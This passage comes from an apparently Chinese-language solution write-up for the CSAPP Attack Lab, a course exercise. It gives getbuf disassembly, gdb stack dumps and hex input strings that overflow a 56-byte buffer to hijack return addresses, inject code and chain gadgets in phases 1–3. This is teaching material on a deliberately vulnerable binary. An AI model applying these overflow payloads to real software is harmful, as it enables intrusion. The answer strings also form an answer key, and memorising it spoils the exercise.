0x7ffffff93190: 0xaf    0x1a    0x40    0x00    0x00    0x00    0x00    0x00
0x7ffffff93198: 0xfd    0x19    0x40    0x00    0x00    0x00    0x00    0x00
0x7ffffff931a0: 0x37    0x64    0x37    0x35    0x31    0x30    0x66    0x30
```

所以答案就是
```txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
3a 1b 40 00 00 00 00 00
af 1a 40 00 00 00 00 00
a3 1a 40 00 00 00 00 00
40 00 00 00 00 00 00 00
51 1b 40 00 00 00 00 00
b6 1b 40 00 00 00 00 00
db 1a 40 00 00 00 00 00
af 1a 40 00 00 00 00 00
fd 19 40 00 00 00 00 00
37 64 37 35 31 30 66 30
```


## 110
### phase1

```c
0000000000401849 <getbuf>:
  401849:	48 83 ec 38          	sub    $0x38,%rsp
  40184d:	48 89 e7             	mov    %rsp,%rdi
  401850:	e8 94 02 00 00       	callq  401ae9 <Gets>
  401855:	b8 01 00 00 00       	mov    $0x1,%eax
  40185a:	48 83 c4 38          	add    $0x38,%rsp
  40185e:	c3                   	retq   
```
注意到栈空间为 0x38 字节，填充56个字节垃圾信息后跟上touch1()函数首地址：000000000040185f

**答案**：
```txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
5f 18 40 00 00 00 00 00
```


### phase2

注入代码：
```txt
inject_code.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c6 09 15 be 10 	mov    $0x10be1509,%rsi
   7:	c3                   	retq         
```

调试得到栈顶地址(注入代码地址)：0x5565a558
```c
(gdb) x/80xb $rsp
0x5565a558:     0x48    0xc7    0xc6    0x09    0x15    0xbe    0x10    0xc3
0x5565a560:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5565a568:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5565a570:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5565a578:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5565a580:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5565a588:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5565a590:     0x8d    0x18    0x40    0x00    0x00    0x00    0x00    0x00
0x5565a598:     0x8d    0x18    0x40    0x00    0x00    0x00    0x00    0x00
0x5565a5a0:     0x00    0x20    0x40    0x00    0x00    0x00    0x00    0x00
```
**答案：**
```txt
bf 09 15 be 10 c3 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
58 a5 65 55 00 00 00 00
8d 18 40 00 00 00 00 00
```
**后面的的就只给答案了，写太多容易乱了**
### phase3
**答案：**
```txt
5f c3 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
58 a5 65 55 00 00 00 00
a8 a5 65 55 00 00 00 00
a4 19 40 00 00 00 00 00
31 30 62 65 31 35 30 39
```

**~~更多内容敬请期待~~** 

# 参考内容
[字符串转ASCII码](https://www.asciim.cn/m/tools/convert_string_to_ascii.html)
[CSAPP | Lab3-Attack Lab 深入解析(有个很好用的表)](https://zhuanlan.zhihu.com/p/476396465)
[汇编指令和机器码的对应表](https://blog.csdn.net/xqhrs232/article/details/52084324)
[CSAPP - Attack Lab 详解](https://jkup64.github.io/2023/06/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l3-attacklab/index.html)